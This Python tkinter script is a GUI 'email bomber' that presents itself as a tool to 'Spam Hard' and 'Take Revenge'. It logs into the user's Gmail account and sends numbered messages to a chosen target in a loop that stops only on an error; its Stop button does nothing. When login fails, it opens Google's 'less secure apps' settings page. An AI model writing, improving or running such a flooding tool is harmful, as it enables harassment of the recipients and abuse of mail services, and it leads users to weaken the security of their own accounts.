from email.mime.text import MIMEText
from tkinter import *
from email.mime.multipart import MIMEMultipart
import smtplib
import webbrowser
import logging
import time
root = Tk()
root.title("Send Email")
root.geometry("350x400")
def sendMail(event):
    logger = logging.getLogger("logging_tryout2")
    logger.setLevel(logging.DEBUG)
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s;%(levelname)s;%(message)s")
    ch.setFormatter(formatter)
    logger.addHandler(ch)
    i = 1
    num = 1
    attack = Label(root, text = "Attack Started", fg = "red")
    attack.pack()
    stop = Button(root, text = "Stop")
    stop.pack()
    time.sleep(2)
    while i < 2:
        sNum = str(num)
        source = email.get()
        password = password2.get()
        target = to.get()
        ts = subject.get()
        msg = MIMEMultipart()
        msg['From'] = source
        msg['To'] = target
        msg['Subject'] = ts + sNum
        out = message.get()
        msg.attach(MIMEText(out,'plain'))
        text = msg.as_string()
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(source, password)
            server.sendmail(source,target,text)
            num = num + 1
            logger.info(" Message sent successfully to {}  attempt= {}".format(target,num-1))
            suc = Label(root, text = "Message Successfully sent", fg = "red")
            suc.pack()
        except:
            error = Label(root, text = "You don't have given access to gmail account to send email", fg = "red")
            error.pack()
            error2 = Label(root, text = "Make sure you have internet connection and has entered proper password of email", fg = "red")
            error2.pack()
            root.geometry("450x400")
            allow = Button(root, text = "Allow")
            allow.pack()
            allow.bind('<Button-1>',allowEmail)
            break

def allowEmail(event):
    webbrowser.open("https://myaccount.google.com/lesssecureapps",new= 1)
def facebook(event):
    webbrowser.open("https://www.facebook.com/Kaneki.ghoul360",new= 1)

def website(event):
    webbrowser.open("http://kaneki-intro.000webhostapp.com/",new = 1)
Welcome = Label(root, text = "Welcome... Spam Hard :D... Take Revenge", bg = "orange" , fg = "white")
Welcome.pack(fill = X)
lEmail = Label(root, text = "Enter your email")
lEmail.pack()
email = Entry(root,width = 40,fg="red")
email.pack()
lPassword = Label(root, text = "Enter your Password")
lPassword.pack()
password2 = Entry(root,width = 40, show = "-")
password2.pack()
btn = Button(root, text = "Send", fg = "white" , bg = "red")
lSubject = Label(root, text = "Enter Subject")
lSubject.pack()
subject = Entry(root,width = 40,fg="red")
subject.pack()
lTo = Label(root, text = "Enter Address of user")
lTo.pack()
to = Entry(root,width = 40,fg="red")
to.pack()
lMessage = Label(root, text = "Enter Message")
lMessage.pack()
message = Entry(root,width = 40,fg="red")
message.pack()
btn.bind('<Button-1>',sendMail)
btn.pack()
cpy = Label(root, text = "Created by: Muhammad Owais", fg = "red")
cpy.pack()
btn2 = Button(root, text = "My website", fg = "white", bg = "black")
btn2.pack()
btn3 = Button(root, text = "My facebook", fg = "white", bg = "black")
btn3.pack(side = BOTTOM)
btn2.bind('<Button-1>', website)
btn3.bind('<Button-1>', facebook)
root.mainloop()
